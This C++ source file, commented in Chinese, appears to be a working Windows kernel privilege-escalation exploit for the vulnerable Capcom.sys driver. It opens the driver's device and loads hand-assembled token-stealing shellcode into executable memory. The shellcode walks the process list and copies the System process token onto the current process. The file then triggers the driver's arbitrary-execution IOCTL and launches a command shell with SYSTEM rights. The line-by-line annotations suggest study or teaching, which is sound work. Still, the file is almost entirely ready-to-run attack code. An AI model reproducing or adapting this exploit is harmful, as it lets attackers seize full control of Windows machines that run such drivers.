#include <Windows.h>
#include <iostream>

#define SymLinkName L"\\\\.\\Htsysm72FB"

typedef struct _IOCTL_IN_BUFFER
{
    void *ShellcodeAddress;
    BYTE Shellcode[0x100];
} IOCTL_IN_BUFFER, *PIOCTL_IN_BUFFER;

int main(int argc, const char *argv[])
{
    // 1. 取得 Device Handle
    HANDLE hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        return 0;
    }

    // 2. 申請要傳送到驅動程式的記憶體
    IOCTL_IN_BUFFER *InBufferContents =
        (IOCTL_IN_BUFFER *)VirtualAlloc(nullptr, sizeof(IOCTL_IN_BUFFER), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!InBufferContents)
    {
        printf("VirtualAlloc failed with Win32 error code: %x\n", GetLastError());
        return 0;
    }
    InBufferContents->ShellcodeAddress = InBufferContents->Shellcode;

    // 3. 寫入提權的 Shellcode
    BYTE token_steal[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"    // mov rdx, [gs:188h]     ; 從 KPCR 取得 ETHREAD 位址
        "\x4C\x8B\x82\xB8\x00\x00\x00"            // mov r8, [rdx + b8h]    ; 從 ETHREAD 取得 EPROCESS 位址
        "\x4D\x8B\x88\xe8\x02\x00\x00"    // mov r9, [r8 + 2e8h]    ; 從 EPROCESS 取得 ActiveProcessLinks 的 List Head 位址
        "\x49\x8B\x09"                    // mov rcx, [r9]          ; 取得 List 中第一個 Process 的 ActiveProcessLinks
        // find_system_proc:   ; 迴圈找到 system 的 EPROCESS 並取得 Token 的值
        "\x48\x8B\x51\xF8"    // mov rdx, [rcx - 8]    ; 取得在 ActiveProcessLinks (0x2e8) 前面的 UniqueProcessId (0x2e0)
        "\x48\x83\xFA\x04"    // cmp rdx, 4            ; 確認 UniqueProcessId 是不是 System Process (pid: 4)
        "\x74\x05"            // jz found_system       ; 如果是 System 就跳到 found_system
        "\x48\x8B\x09"        // mov rcx, [rcx]        ; 不是 System 就繼續從找下個 Process
        "\xEB\xF1"            // jmp find_system_proc
        // found_system:
        "\x48\x8B\x41\x70"    // mov rax, [rcx + 70h]  ; 取得在 ActiveProcessLinks (0x2e8) 後面的 Token (0x358)
        "\x24\xF0"            // and al, 0f0h          ; 清除 TOKEN 的 _EX_FAST_REF 結構後 4 bits 的 flags
        // find_current_process:    ; 迴圈找到目標 Process 的 EPROCESS
        "\x48\x8B\x51\xF8"    // mov rdx, [rcx-8]      ; 取得在 ActiveProcessLinks (0x2e8) 前面的 UniqueProcessId (0x2e0)
        "\x48\x81\xFA\x99\x99\x00\x00"    // cmp rdx, <Current Process>    ; 確認 UniqueProcessId 是不是目標 Process
        "\x74\x05"                        // jz found_cmd      ; 是目標 Process 就跳到 found_current_process
        "\x48\x8B\x09"                    // mov rcx, [rcx]    ; 不是目標 Process 就繼續找下個 Process
        "\xEB\xEE"                        // jmp find_current_process
        // found_current_process:
        "\x48\x89\x41\x70"    // mov [rcx+70h], rax    ; 把目標 Process 的 EPROCESS Token 竄改為 System 的 EPROCESS Token
        "\xc3";               // ret

    // 將目標 pid 填入 Shellcode
    token_steal[54] = GetCurrentProcessId();
    token_steal[55] = GetCurrentProcessId() >> 8;

    // 把提權 Shellcode 寫入要傳送到驅動程式的記憶體中
    memcpy(InBufferContents->Shellcode, token_steal, 71);

    // 4. 觸發 Capcom.sys 的任意執行
    uint32_t OutBuffer = 0;
    DWORD dwWrite = 0;
    DeviceIoControl(hDevice, 0xaa013044, InBufferContents, 8, &OutBuffer, 4, &dwWrite, nullptr);

    // 5. 執行 cmd，如果有成功提權應該是 System 權限
    system("cmd");
    VirtualFree(InBufferContents, 0, MEM_RELEASE);
    return 0;
}